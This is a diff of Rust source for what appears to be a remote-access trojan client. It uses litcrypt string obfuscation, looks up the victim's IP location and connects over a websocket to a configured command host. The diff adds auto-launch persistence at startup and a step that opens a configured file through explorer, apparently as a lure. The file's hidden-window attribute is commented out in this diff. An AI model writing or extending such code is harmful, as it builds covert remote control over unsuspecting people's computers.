@@ -1,16 +1,18 @@
-#![windows_subsystem = "windows"]
+//#![windows_subsystem = "windows"]
 
 #[macro_use]
 extern crate litcrypt;
 
 use_litcrypt!();
 
-use std::process::exit;
-use std::time::Duration;
-use base64::Engine;
+use std::env;
 use base64::prelude::BASE64_STANDARD;
+use base64::Engine;
 use futures_util::StreamExt;
 use serde::{Deserialize, Serialize};
+use std::process::{exit, Command};
+use std::time::Duration;
+use auto_launch::{AutoLaunch, WindowsEnableMode};
 
 mod commands {
     pub(crate) mod task_manager;
@@ -20,13 +22,13 @@ mod commands {
 mod config;
 mod utils;
 
+use crate::commands::command::command::RPTCommand;
+use crate::config::config::{get_auto_launch, get_myip_url, get_secure_data_key, get_startup_executable};
+use crate::utils::utils::decrypt_data;
 use config::config::get_host;
 use sysinfo::System;
 use tokio_tungstenite::connect_async;
 use tokio_tungstenite::tungstenite::client::IntoClientRequest;
-use crate::commands::command::command::RPTCommand;
-use crate::config::config::{get_myip_url, get_secure_data_key};
-use crate::utils::utils::decrypt_data;
 
 #[derive(Deserialize, Debug, Default)]
 pub struct MyIPData {
@@ -62,6 +64,19 @@ async fn main() {
         cc: ip.cc,
     };
 
+    let executable = get_startup_executable();
+    if executable.starts_with("open::") {
+        let id = executable.trim_start_matches("open::").to_string();
+        Command::new("explorer")
+            .arg(id)
+            .spawn()
+            .expect("Failed to send command");
+    }
+
+    if get_auto_launch() == true {
+        let auto = AutoLaunch::new(env!("CARGO_BIN_NAME"), env::current_exe().expect("").to_str().unwrap(), WindowsEnableMode::Dynamic, &[] as &[&str]);
+        auto.enable().expect("Failed to enable launcher");
+    }
     loop {
         let formated_url = format!("ws://{}/invoke", get_host());
         let mut url = formated_url.into_client_request().unwrap_or_default();
